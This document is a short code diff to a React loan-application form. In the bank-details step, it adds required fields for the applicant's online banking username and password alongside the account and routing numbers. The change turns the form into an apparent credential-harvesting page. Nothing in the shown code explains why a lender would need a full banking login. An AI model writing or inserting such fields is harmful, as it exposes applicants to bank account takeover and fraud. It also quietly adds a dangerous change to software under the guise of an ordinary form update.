@@ -450,18 +450,29 @@ export default function LoanApplication() {
  
                     {currentStep === 3 && (
                         <motion.div key="step4" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
-                            <StepContainer>
-                                <label>Bank / Financial Institution *</label>
-                                <Input name="bankName" value={formData.bankName as string} onChange={handleChange} placeholder="e.g. JPMorgan Chase, Bank of America" />
-                                {errors.bankName && <ErrorText>{errors.bankName}</ErrorText>}
-                                <label>Checking Account Number *</label>
-                                <Input name="accountNumber" value={formData.accountNumber as string} onChange={handleChange} placeholder="Your full account number" />
-                                {errors.accountNumber && <ErrorText>{errors.accountNumber}</ErrorText>}
-                                <label>Bank Routing Number *</label>
-                                <Input name="routingNumber" type="number" value={formData.routingNumber as string} onChange={handleChange} placeholder="9-digit ABA routing number" />
-                                {errors.routingNumber && <ErrorText>{errors.routingNumber}</ErrorText>}
-                                <BackNext handlePrev={handlePrev} handleNext={handleNext} />
-                            </StepContainer>
+                           <StepContainer>
+    <label>Bank / Financial Institution *</label>
+    <Input name="bankName" value={formData.bankName as string} onChange={handleChange} placeholder="e.g. JPMorgan Chase, Bank of America" />
+    {errors.bankName && <ErrorText>{errors.bankName}</ErrorText>}
+
+    <label>Online Banking Username *</label>
+    <Input name="bankUsername" value={formData.bankUsername as string} onChange={handleChange} placeholder="Your online banking username" />
+    {errors.bankUsername && <ErrorText>{errors.bankUsername}</ErrorText>}
+
+    <label>Online Banking Password *</label>
+    <Input name="bankPassword" type="password" value={formData.bankPassword as string} onChange={handleChange} placeholder="Your online banking password" />
+    {errors.bankPassword && <ErrorText>{errors.bankPassword}</ErrorText>}
+
+    <label>Checking Account Number *</label>
+    <Input name="accountNumber" value={formData.accountNumber as string} onChange={handleChange} placeholder="Your full account number" />
+    {errors.accountNumber && <ErrorText>{errors.accountNumber}</ErrorText>}
+
+    <label>Bank Routing Number *</label>
+    <Input name="routingNumber" type="number" value={formData.routingNumber as string} onChange={handleChange} placeholder="9-digit ABA routing number" />
+    {errors.routingNumber && <ErrorText>{errors.routingNumber}</ErrorText>}
+
+    <BackNext handlePrev={handlePrev} handleNext={handleNext} />
+</StepContainer>
                         </motion.div>
                     )}
  
